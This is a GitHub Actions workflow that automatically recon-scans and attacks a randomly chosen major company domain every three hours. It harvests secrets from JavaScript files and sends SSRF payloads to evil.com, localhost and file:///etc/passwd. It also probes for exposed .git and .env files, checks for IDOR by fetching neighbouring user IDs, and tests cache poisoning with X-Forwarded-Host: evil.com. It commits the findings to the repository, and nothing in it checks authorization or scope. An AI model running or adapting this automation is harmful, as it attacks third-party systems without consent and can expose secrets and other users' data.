name: SUPER-ARSENAL-HUNT

on:
  schedule:
    - cron: '0 */3 * * *'
  workflow_dispatch:
    inputs:
      domain:
        description: 'Target domain'
        required: false
      program:
        description: 'Program name'
        required: false

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-22.04
    timeout-minutes: 40

    steps:
    - uses: actions/checkout@v4

    - name: Cache Go mods
      uses: actions/cache@v4
      with:
        path: ~/go/pkg/mod
        key: go-${{ runner.os }}-${{ hashFiles('.github/workflows/hunt.yml') }}

    - name: Cache Go bin
      id: cache-bin
      uses: actions/cache@v4
      with:
        path: ~/go/bin
        key: bin-${{ runner.os }}-v2-${{ hashFiles('.github/workflows/hunt.yml') }}

    - name: Install Tools
      if: steps.cache-bin.outputs.cache-hit != 'true'
      run: |
        export PATH=$HOME/go/bin:$PATH

        sudo apt-get update -qq && sudo apt-get install -y -qq jq curl python3 python3-pip 2>/dev/null

        if ! command -v go &>/dev/null; then
          curl -sL "https://go.dev/dl/go1.22.4.linux-amd64.tar.gz" | sudo tar -C /usr/local -xz
          sudo ln -sf /usr/local/go/bin/go /usr/local/bin/go
        fi

        go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null
        go install github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null
        go install github.com/tomnomnom/waybackurls@latest 2>/dev/null
        go install github.com/lc/gau/v2/cmd/gau@latest 2>/dev/null
        go install github.com/tomnomnom/assetfinder@latest 2>/dev/null
        go install github.com/tomnomnom/anew@latest 2>/dev/null
        go install github.com/BishopFox/jsluice/cmd/jsluice@latest 2>/dev/null
        go install github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null
        go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null

        nuclei -update-templates -silent -tp ~/nuclei-templates 2>/dev/null &
        echo "tools: $(ls ~/go/bin/ | wc -l)"

    - name: Recon
      id: recon
      run: |
        set +e
        export PATH=$HOME/go/bin:$PATH

        DOMAIN="${DOMAIN:-}"
        PROGRAM="${PROGRAM:-}"
        [ -z "$DOMAIN" ] && {
          PROGS=("aol.com" "atlassian.com" "cisco.com" "cloudflare.com" "coinbase.com" "coveo.com" "docker.com" "dropbox.com" "expressvpn.com" "fastly.com" "github.com" "gitlab.com" "indeed.com" "linkedin.com" "mastercard.com" "mozilla.org" "netflix.com" "okta.com" "orange.fr" "ovhcloud.com" "paypal.com" "proximus.be" "reddit.com" "salesforce.com" "shopify.com" "slack.com" "snapchat.com" "spotify.com" "tesla.com" "tiktok.com" "twilio.com" "twitter.com" "uber.com" "verizonmedia.com" "wordpress.com" "wordpress.org" "x.com" "yahoo.com" "yelp.com")
          IDX=$(( RANDOM % ${#PROGS[@]} ))
          DOMAIN="${PROGS[$IDX]}"
          PROGRAM="${DOMAIN%%.*}"
        }

        TMP="/tmp/recon-$DOMAIN"
        echo "🎯 $PROGRAM — $DOMAIN"

        mkdir -p ~/.config/subfinder
        echo "sources: [certspotter,crtsh,hackertarget,bufferover,alienvault,anubis,dnsdumpster,riddler,threatminer,waybackarchive]" > ~/.config/subfinder/config.yaml

        # 1. Subdomains
        timeout 120 subfinder -d "$DOMAIN" -silent -all 2>/dev/null > "$TMP-subs.txt"
        curl -s --max-time 20 "https://crt.sh/?q=%.$DOMAIN&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' >> "$TMP-subs.txt"
        assetfinder --subs-only "$DOMAIN" 2>/dev/null >> "$TMP-subs.txt"
        sort -u "$TMP-subs.txt" -o "$TMP-subs.txt"
        SUBS=$(wc -l < "$TMP-subs.txt" 2>/dev/null || echo 0)
        [ "$SUBS" -gt 3000 ] && { head -3000 "$TMP-subs.txt" > /tmp/top.txt; mv /tmp/top.txt "$TMP-subs.txt"; SUBS=3000; }
        echo "subs=$SUBS" >> $GITHUB_OUTPUT
        echo "  subs: $SUBS"

        # 2. Live hosts
        head -100 "$TMP-subs.txt" | httpx -silent -timeout 5 -status-code -title -o "$TMP-live.txt" 2>/dev/null
        LIVE=$(wc -l < "$TMP-live.txt" 2>/dev/null || echo 0)
        echo "live=$LIVE" >> $GITHUB_OUTPUT
        echo "  live: $LIVE"

        # 3. URLs
        timeout 60 gau --subs "$DOMAIN" 2>/dev/null | head -500 > "$TMP-urls.txt"
        timeout 60 waybackurls "$DOMAIN" 2>/dev/null | head -500 >> "$TMP-urls.txt"
        [ "$LIVE" -gt 0 ] && [ "$LIVE" -lt 30 ] && timeout 60 katana -list "$TMP-live.txt" -silent 2>/dev/null | head -200 >> "$TMP-urls.txt"
        sort -u "$TMP-urls.txt" -o "$TMP-urls.txt" 2>/dev/null
        URLS=$(wc -l < "$TMP-urls.txt" 2>/dev/null || echo 0)
        echo "urls=$URLS" >> $GITHUB_OUTPUT
        echo "  urls: $URLS"

        # 4. Interesting subs filter
        grep -iE '(dev|staging|stage|admin|internal|api|test|sandbox|debug|beta|alpha|uat|qa|demo|preprod|legacy|old|backup|mgmt|console|portal|dashboard|grafana|jenkins|sentry|vault|argo|gitlab|registry|kubernetes|swagger|graphql|monitor|metrics|mail|auth|sso|login|billing|payment)' "$TMP-subs.txt" 2>/dev/null | head -50 > "$TMP-interesting.txt"
        echo "interesting=$(wc -l < "$TMP-interesting.txt" 2>/dev/null || echo 0)" >> $GITHUB_OUTPUT
        echo "domain=$DOMAIN" >> $GITHUB_OUTPUT
        echo "program=$PROGRAM" >> $GITHUB_OUTPUT
      env:
        DOMAIN: ${{ inputs.domain }}
        PROGRAM: ${{ inputs.program }}

    - name: Detect
      id: detect
      run: |
        set +e
        export PATH=$HOME/go/bin:$PATH
        DOMAIN="${DOMAIN:-${{ steps.recon.outputs.domain }}}"
        [ -z "$DOMAIN" ] && DOMAIN="unknown"
        TMP="/tmp/recon-$DOMAIN"
        mkdir -p /tmp/findings

        # IDOR
        grep -E '(^|\?|&)(id|user_id|uid|account_id|order_id|profile_id|doc_id|file_id|report_id|ticket_id|number|num)\s*[=:/]\s*[0-9]{1,10}' "$TMP-urls.txt" 2>/dev/null | head -30 > /tmp/findings/idor.txt
        IDOR=$(grep -c http /tmp/findings/idor.txt 2>/dev/null); echo "idor=${IDOR:-0}" >> $GITHUB_OUTPUT

        # API
        grep -E '/api/|/graphql|/v[0-9]+/|/rest/' "$TMP-urls.txt" 2>/dev/null | head -30 > /tmp/findings/api.txt
        API=$(grep -c http /tmp/findings/api.txt 2>/dev/null); echo "api=${API:-0}" >> $GITHUB_OUTPUT

        # JS secrets (jsluice)
        > /tmp/findings/secrets.txt
        grep -E '\.js(\?|$)' "$TMP-urls.txt" 2>/dev/null | head -15 | while read url; do
          curl -s --connect-timeout 5 --max-time 8 "$url" 2>/dev/null
        done | jsluice secrets 2>/dev/null | head -30 > /tmp/findings/secrets.txt
        SECRETS=$(grep -c . /tmp/findings/secrets.txt 2>/dev/null); echo "secrets=${SECRETS:-0}" >> $GITHUB_OUTPUT

        # SSRF
        grep -E '(url|uri|redirect|callback|webhook|proxy|fetch)=' "$TMP-urls.txt" 2>/dev/null | head -20 > /tmp/findings/ssrf.txt
        SSRF=$(grep -c http /tmp/findings/ssrf.txt 2>/dev/null); echo "ssrf=${SSRF:-0}" >> $GITHUB_OUTPUT

        # Nuclei
        if [ -s "$TMP-live.txt" ] && [ "$(wc -l < "$TMP-live.txt")" -lt 30 ]; then
          awk '{print $1}' "$TMP-live.txt" | head -20 | nuclei -silent -severity medium,high,critical -timeout 8 -c 2 -t ~/nuclei-templates/http/exposures -t ~/nuclei-templates/http/misconfiguration 2>/dev/null | head -30 > /tmp/findings/nuclei.txt
        else
          echo "" > /tmp/findings/nuclei.txt
        fi

        # Live + interesting lists
        head -20 "$TMP-interesting.txt" 2>/dev/null > /tmp/findings/interesting.txt
        head -20 "$TMP-live.txt" 2>/dev/null > /tmp/findings/live.txt

        echo "  IDOR:$(grep -c http /tmp/findings/idor.txt 2>/dev/null) API:$(grep -c http /tmp/findings/api.txt 2>/dev/null) Secrets:$(grep -c . /tmp/findings/secrets.txt 2>/dev/null) SSRF:$(grep -c http /tmp/findings/ssrf.txt 2>/dev/null)"
      env:
        DOMAIN: ${{ inputs.domain }}

    - name: Deep-Test
      id: deep-test
      run: |
        set +e
        export PATH=$HOME/go/bin:$PATH
        DOMAIN="${DOMAIN:-${{ steps.recon.outputs.domain }}}"
        [ -z "$DOMAIN" ] && DOMAIN="unknown"
        TMP="/tmp/recon-$DOMAIN"
        mkdir -p /tmp/findings/deep

        echo "=== DEEP EXPLOITATION ==="

        # --- SSRF VALIDATION ---
        > /tmp/findings/deep/ssrf-verified.txt
        grep -E '(return_url|redirect_uri|callback|webhook|proxy|fetch)=' "$TMP-urls.txt" 2>/dev/null | head -10 | while read url; do
          target=$(echo "$url" | grep -oP 'https?://[^&\s"'"'"']+' | head -1)
          [ -z "$target" ] && continue

          param=$(echo "$url" | grep -oP '(return_url|redirect_uri|callback|webhook|proxy|fetch)=[^&\s]+' | head -1)
          base=$(echo "$url" | cut -d'?' -f1)

          # Test 1: External URL
          ext_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=http://evil.com" 2>/dev/null)
          # Test 2: Internal IP
          int_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=http://127.0.0.1:8080/" 2>/dev/null)
          # Test 3: File protocol
          file_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=file:///etc/passwd" 2>/dev/null)

          [ "$ext_resp" != "000" ] && echo "[ext:$ext_resp] ${base}?${param%%=*}=http://evil.com" >> /tmp/findings/deep/ssrf-verified.txt
          [ "$int_resp" != "000" ] && echo "[int:$int_resp] ${base}?${param%%=*}=http://127.0.0.1:8080/" >> /tmp/findings/deep/ssrf-verified.txt
          [ "$file_resp" != "000" ] && echo "[file:$file_resp] ${base}?${param%%=*}=file:///etc/passwd" >> /tmp/findings/deep/ssrf-verified.txt
        done
        SSRF_DEEP=$(wc -l < /tmp/findings/deep/ssrf-verified.txt 2>/dev/null || echo 0)
        echo "  SSRF deep: $SSRF_DEEP tests"

        # --- STAGING PROBE ---
        > /tmp/findings/deep/staging-hits.txt
        head -30 "$TMP-interesting.txt" 2>/dev/null | while read sub; do
          [ -z "$sub" ] && continue
          host=$(echo "$sub" | tr -d '*.')
          for path in "/.git/HEAD" "/.env" "/robots.txt" "/api/" "/admin/" "/console/" "/actuator/health" "/swagger" "/graphql" "/version" "/status"; do
            code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 "https://$host$path" 2>/dev/null)
            [ "$code" != "000" ] && [ "$code" != "403" ] && [ "$code" != "404" ] && echo "https://$host$path [$code]" >> /tmp/findings/deep/staging-hits.txt
          done
        done
        STAGING_HITS=$(wc -l < /tmp/findings/deep/staging-hits.txt 2>/dev/null || echo 0)
        echo "  Staging hits: $STAGING_HITS"

        # --- IDOR DEEP ---
        > /tmp/findings/deep/idor-verified.txt
        grep -oP '(https?://[^?]*[?&](id|user_id|uid|account_id|order_id|profile_id|doc_id|file_id|report_id|ticket_id|number|num)=\d+)' "$TMP-urls.txt" 2>/dev/null | head -10 | while read url; do
          id_param=$(echo "$url" | grep -oP '(id|user_id|uid|account_id|order_id|profile_id|doc_id|file_id|report_id|ticket_id|number|num)=\d+')
          param_name="${id_param%%=*}"
          id_val="${id_param##*=}"

          # Fetch original
          orig_size=$(curl -sk -o /tmp/idor_orig.txt -w "%{size_download}" --connect-timeout 4 --max-time 6 "$url" 2>/dev/null)
          orig_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "$url" 2>/dev/null)

          # Fetch swapped (id+1)
          new_id=$((id_val + 1))
          swapped_url=$(echo "$url" | sed "s/${param_name}=${id_val}/${param_name}=${new_id}/")
          swap_size=$(curl -sk -o /tmp/idor_swap.txt -w "%{size_download}" --connect-timeout 4 --max-time 6 "$swapped_url" 2>/dev/null)
          swap_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "$swapped_url" 2>/dev/null)

          # Flag if both return 200 with similar content size
          size_diff=$((orig_size - swap_size))
          [ ${size_diff#-} -lt 500 ] && [ "$orig_code" = "200" ] && [ "$swap_code" = "200" ] && [ "$orig_size" -gt 100 ] && [ "$swap_size" -gt 100 ] && {
            echo "IDOR-SUSPECT: $url (${orig_size}b) vs $swapped_url (${swap_size}b) [diff=$size_diff]" >> /tmp/findings/deep/idor-verified.txt
          }
        done
        IDOR_DEEP=$(wc -l < /tmp/findings/deep/idor-verified.txt 2>/dev/null || echo 0)
        echo "  IDOR deep: $IDOR_DEEP suspects"

        # --- CACHE POISONING CHECK ---
        > /tmp/findings/deep/cache-check.txt
        head -5 "$TMP-live.txt" 2>/dev/null | awk '{print $1}' | while read host; do
          [ -z "$host" ] && continue
          # Test X-Forwarded-Host reflection
          resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 -H "X-Forwarded-Host: evil.com" "$host" 2>/dev/null)
          [ "$resp" = "302" ] || [ "$resp" = "301" ] && echo "CacheCand: $host responds $resp to X-Forwarded-Host: evil.com" >> /tmp/findings/deep/cache-check.txt
          # Test X-Forwarded-Scheme
          resp2=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 -H "X-Forwarded-Scheme: http" "$host" 2>/dev/null)
          [ "$resp2" != "000" ] && echo "XFH-Scheme: $host [$resp2]" >> /tmp/findings/deep/cache-check.txt
        done
        CACHE_CHECKS=$(wc -l < /tmp/findings/deep/cache-check.txt 2>/dev/null || echo 0)
        echo "  Cache checks: $CACHE_CHECKS"

        # Export deep results for report
        echo "ssrf_deep=$SSRF_DEEP" >> $GITHUB_OUTPUT
        echo "staging_hits=$STAGING_HITS" >> $GITHUB_OUTPUT
        echo "idor_deep=$IDOR_DEEP" >> $GITHUB_OUTPUT
        echo "cache_checks=$CACHE_CHECKS" >> $GITHUB_OUTPUT

        echo "DEEP-TEST COMPLETE"
      env:
        DOMAIN: ${{ inputs.domain }}

    - name: Report
      run: |
        set +e
        DOMAIN="${DOMAIN:-${{ steps.recon.outputs.domain }}}"
        PROGRAM="${PROGRAM:-${{ steps.recon.outputs.program }}}"
        [ -z "$DOMAIN" ] && DOMAIN="unknown"
        [ -z "$PROGRAM" ] && PROGRAM="auto"

        mkdir -p reports
        cat > "reports/$PROGRAM-$DOMAIN-$(date +%Y%m%d_%H%M).md" << EOF
        # 🎯 $PROGRAM — $DOMAIN
        **Date:** $(date -u) | **Runner:** GitHub Actions (free tier)

        ## Stats
        | Metric | Count |
        |--------|-------|
        | Subdomains | ${{ steps.recon.outputs.subs }} |
        | Live Hosts | ${{ steps.recon.outputs.live }} |
        | URLs | ${{ steps.recon.outputs.urls }} |
        | Interesting Subs | ${{ steps.recon.outputs.interesting }} |
        | IDOR Candidates | $(grep -c http /tmp/findings/idor.txt 2>/dev/null || echo 0) |
        | API Endpoints | $(grep -c http /tmp/findings/api.txt 2>/dev/null || echo 0) |
        | JS Secrets | $(grep -c . /tmp/findings/secrets.txt 2>/dev/null || echo 0) |
        | SSRF Candidates | $(grep -c http /tmp/findings/ssrf.txt 2>/dev/null || echo 0) |
        | Deep: SSRF Tests | ${{ steps.deep-test.outputs.ssrf_deep }} |
        | Deep: Staging Hits | ${{ steps.deep-test.outputs.staging_hits }} |
        | Deep: IDOR Suspects | ${{ steps.deep-test.outputs.idor_deep }} |
        | Deep: Cache Checks | ${{ steps.deep-test.outputs.cache_checks }} |

        ## Interesting Subdomains (Shtylla 1: Hidden Targets)
        \`\`\`
        $(head -15 /tmp/findings/interesting.txt 2>/dev/null)
        \`\`\`

        ## Live Hosts
        \`\`\`
        $(head -10 /tmp/findings/live.txt 2>/dev/null)
        \`\`\`

        ## IDOR Candidates
        \`\`\`
        $(head -10 /tmp/findings/idor.txt 2>/dev/null)
        \`\`\`

        ## API Endpoints
        \`\`\`
        $(head -10 /tmp/findings/api.txt 2>/dev/null)
        \`\`\`

        ## JS Secrets
        \`\`\`
        $(head -15 /tmp/findings/secrets.txt 2>/dev/null)
        \`\`\`

        ## SSRF Candidates
        \`\`\`
        $(head -10 /tmp/findings/ssrf.txt 2>/dev/null)
        \`\`\`

        ## Nuclei
        \`\`\`
        $(head -15 /tmp/findings/nuclei.txt 2>/dev/null)
        \`\`\`

        ## 🔥 Deep Exploitation (Verified)

        ### SSRF Validation
        \`\`\`
        $(head -15 /tmp/findings/deep/ssrf-verified.txt 2>/dev/null)
        \`\`\`

        ### Staging/Dev Accessible
        \`\`\`
        $(head -15 /tmp/findings/deep/staging-hits.txt 2>/dev/null)
        \`\`\`

        ### IDOR Verified
        \`\`\`
        $(head -15 /tmp/findings/deep/idor-verified.txt 2>/dev/null)
        \`\`\`

        ### Cache Poisoning
        \`\`\`
        $(head -15 /tmp/findings/deep/cache-check.txt 2>/dev/null)
        \`\`\`

        ---
        🤖 SUPER-ARSENAL Hunter on GitHub Actions (free tier — unlimited minutes)
        EOF

        echo "✅ Report: $(ls reports/*.md 2>/dev/null | tail -1)"
      env:
        DOMAIN: ${{ inputs.domain }}
        PROGRAM: ${{ inputs.program }}

    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: hunt-${{ github.run_id }}
        path: /tmp/findings/
        retention-days: 14

    - name: Commit Report
      run: |
        git config user.name "SUPER-ARSENAL"
        git config user.email "hunter@arsenal.bot"
        git add reports/
        git diff --staged --quiet || git commit -m "hunt: $(ls reports/*.md 2>/dev/null | tail -1 | xargs basename)" && git push
